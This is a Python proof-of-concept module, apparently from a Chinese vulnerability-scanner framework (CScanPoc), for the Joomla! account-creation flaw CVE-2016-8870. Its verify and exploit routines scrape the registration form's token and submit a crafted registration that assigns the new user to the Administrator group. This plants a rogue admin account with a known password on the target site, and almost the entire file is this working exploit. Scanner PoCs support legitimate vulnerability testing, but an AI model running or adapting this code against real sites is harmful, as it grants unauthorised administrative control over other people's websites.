# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import random
import re


class Vuln(ABVuln):
    vuln_id = 'Joomla_0002'  # 平台漏洞编号，留空
    name = 'Joomla!存在账号创建漏洞(CNVD-2016-10055)'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-10-24'  # 漏洞公布时间
    desc = '''
        Joomla!是一套基于PHP的开源内容管理系统(CMS)。可用于搭建商业网站、个人博客、信息管理系统、Web服务等，还可进行二次开发以扩充使用范围。
        Joomla!存在账号创建漏洞。不严格的检查允许用户在网站不允许注册时注册账号，远程攻击者利用漏洞可创建账号。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2016-10055'  # 漏洞来源
    cnvd_id = 'CNVD-2016-10055'  # cnvd漏洞编号
    cve_id = 'CVE-2016-8870'  # cve编号
    product = 'Joomla!'  # 漏洞应用名称
    product_version = 'Joomla! 3.4.4 - 3.6.3'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '2f525541-5392-4755-9c7e-5545ea374f71'
    author = 'cscan'  # POC编写者
    create_date = '2018-04-28'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # https://github.com/Medicean/VulApps/tree/master/j/joomla/1
            s = requests.session()
            # get cookie
            r = s.get(
                self.target+'/index.php/component/users/?task=registration.register')
            # 获取token
            p = re.compile(
                r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
            if p.findall(r.text):
                token = p.findall(r.text)[0]
                # 生成随机注册信息
                randstr = '_' + str(random.randint(1, 10000))
                #print('[*] create user: {}'.format('admin'+randstr))
                data = {
                    # User object
                    'task': (None, 'user.register'),
                    'option': (None, 'com_users'),
                    'user[name]': (None, 'admin'+randstr),
                    'user[username]': (None, 'admin'+randstr),
                    'user[password1]': (None, 'admin'+randstr),
                    'user[password2]': (None, 'admin'+randstr),
                    'user[email1]': (None, 'admin'+randstr + '@xx.com'),
                    'user[email2]': (None, 'admin'+randstr + '@xx.com'),
                    'user[groups][]': (None, '7'),  # Administrator!
                    token: (None, '1')
                }
                r = s.post(self.target+'/index.php/component/users/?task=registration.register',
                           files=data, allow_redirects=False)
                if 'index.php?option=com_users&view=registration' in r.headers['location']:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            s = requests.session()
            # get cookie
            r = s.get(
                self.target+'/index.php/component/users/?task=registration.register')
            # 获取token
            p = re.compile(
                r'<input type="hidden" name="([0-9a-f]+)" value="1" />')
            if p.findall(r.text):
                token = p.findall(r.text)[0]
                # 生成随机注册信息
                randstr = '_' + str(random.randint(1, 10000))
                info = 'admin' + randstr
                data = {
                    # User object
                    'task': (None, 'user.register'),
                    'option': (None, 'com_users'),
                    'user[name]': (None, 'admin'+randstr),
                    'user[username]': (None, 'admin'+randstr),
                    'user[password1]': (None, 'admin'+randstr),
                    'user[password2]': (None, 'admin'+randstr),
                    'user[email1]': (None, 'admin'+randstr + '@xx.com'),
                    'user[email2]': (None, 'admin'+randstr + '@xx.com'),
                    'user[groups][]': (None, '7'),  # Administrator!
                    token: (None, '1')
                }
                r = s.post(self.target+'/index.php/component/users/?task=registration.register',
                           files=data, allow_redirects=False)

                if 'index.php?option=com_users&view=registration' in r.headers['location']:
                    self.output.report(self.vuln, '发现{target}存在{vulnname}漏洞，已注册用户名：{name}，密码：{passwd}'.format(
                        target=self.target, vulnname=self.vuln.name, name=info, passwd=info))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))


if __name__ == '__main__':
    Poc().run()
